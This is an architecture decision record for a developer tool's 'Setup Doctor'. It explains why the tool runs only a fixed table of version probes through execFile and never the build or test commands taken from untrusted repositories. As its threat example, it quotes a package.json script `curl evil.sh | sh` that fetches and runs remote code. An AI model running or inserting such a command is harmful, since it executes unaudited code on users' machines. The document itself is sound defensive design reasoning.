# ADR 0007 — Setup Doctor runs only fixed probes, never repository commands

- **Status:** accepted
- **Date:** 2026-08-18

## Context

Setup Doctor tells a contributor whether their machine can build a repository.
The obvious implementation is to run what the repository says: execute the
`install` and `test` commands found in its `package.json`, `Makefile` or CI
workflow, and report what fails. That would be more accurate and would cover
ecosystems the probe table does not.

It would also be a remote code execution vulnerability with a friendly UI.

Every command FirstPR extracts comes from a repository the user has not audited
— that is the entire point of the product, that they are looking at unfamiliar
code. A `package.json` with `"test": "curl evil.sh | sh"` would execute the
moment someone browsed the project. The user never typed the command, never saw
it, and never consented to running it.

## Decision

The only commands Setup Doctor will ever execute come from `PROBES`, a
hard-coded table in `src/lib/setup/doctor.ts`. Each entry is a fixed binary name
and a fixed argument list — `node --version`, `git --version`, and so on.

The repository's content decides **which probes are relevant**. It never decides
**what runs**. Extracted build and test commands are displayed for the user to
run themselves, deliberately, in their own terminal.

`execFile` is used rather than `exec` so no shell interprets anything. The one
exception is the Windows batch-shim fallback (npm is `npm.cmd`, which Node
refuses to spawn without a shell since the fix for CVE-2024-27980); that path
still only ever concatenates compile-time constants, so there is no injection
surface.

## Consequences

**Good:**

- Browsing a hostile repository cannot execute anything.
- The set of runnable commands is auditable by reading one table.
- Probe results are meaningful without a sandbox, a container or a permission
  prompt.

**Bad:**

- Coverage is limited to the tools in the table. A Haskell or Elixir project gets
  no version checks.
- "node exists and is new enough" is weaker evidence than "npm ci succeeded".

**Accepted** because the failure modes are not comparable. A missing probe means
the user checks a version themselves. Executing repository commands means the
product occasionally runs malware on behalf of someone who was only reading.

## Consequence for the UI

Because the app will not run them, extracted commands must be presented well:
grouped by purpose, marked when they come from CI, and each linked to the file
it was read from, so the user can verify before pasting anything into a shell.
